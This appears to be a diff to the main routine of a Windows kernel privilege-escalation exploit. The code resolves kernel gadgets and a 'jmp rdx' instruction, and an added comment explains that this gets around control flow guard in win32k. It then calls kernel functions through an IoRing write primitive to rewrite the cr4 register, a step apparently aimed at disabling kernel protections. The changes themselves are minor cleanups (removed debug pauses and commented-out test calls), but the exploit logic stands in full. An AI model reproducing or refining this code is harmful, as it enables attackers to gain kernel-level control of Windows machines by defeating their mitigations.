@@ -150,6 +150,10 @@ int main(int argc, char* argv[])
 	DWORD64 gadgetKernelAddress = (DWORD64)kernelBase + gadget - (DWORD64)kernelHandle;
 	ConsoleSuccess("Gadget: 0x%p", gadgetKernelAddress);
 
+	//
+	// Using jmp rdx here to get around KERNEL_SECURITY_CHECK_FAILURE
+	// since win32k uses control flow guard
+	//
 	ConsoleInfo("Resolving jump address...");
 	DWORD64 jumpScan = UtilsFindPatternImage(kernelHandle, "FF E2");
 	if (!jumpScan)
@@ -194,18 +198,12 @@ int main(int argc, char* argv[])
 
 	ConsoleSuccess("Write successful");
 
-	/*CallKernelFunction(pointerKernelAddress, (VOID*)0xDEADFEEDFEED, 0x0);
-	CallKernelFunction(pointerKernelAddress, (PVOID)0xDEADFEEDFEED, 0x00000000000506F8);
-	IoRingRundown();
-	while (TRUE) {}*/
-
 	ConsoleInfo("Changing cr4...");
 	status = CallKernelFunction(pointerKernelAddress, (PVOID)gadgetKernelAddress, 0x00000000000506F8, 0x0);
 	if (!status)
 	{
 		ConsoleError("Failed to call function!");
 		IoRingRundown();
-		getchar();
 		return -1;
 	}
 
@@ -215,7 +213,6 @@ int main(int argc, char* argv[])
 	{
 		ConsoleError("Failed to call function!");
 		IoRingRundown();
-		getchar();
 		return -1;
 	}
 
@@ -224,7 +221,6 @@ int main(int argc, char* argv[])
 	{
 		ConsoleError("Callback function was not called, exploit was unsuccessful!");
 		IoRingRundown();
-		getchar();
 		return -1;
 	}
 
@@ -247,12 +243,10 @@ int main(int argc, char* argv[])
 	{
 		ConsoleError("Failed to call function!");
 		IoRingRundown();
-		getchar();
 		return -1;
 	}
 
 	IoRingRundown();
 	ConsoleSuccess("Everything successful");
-	getchar();
 	return 0;
 }
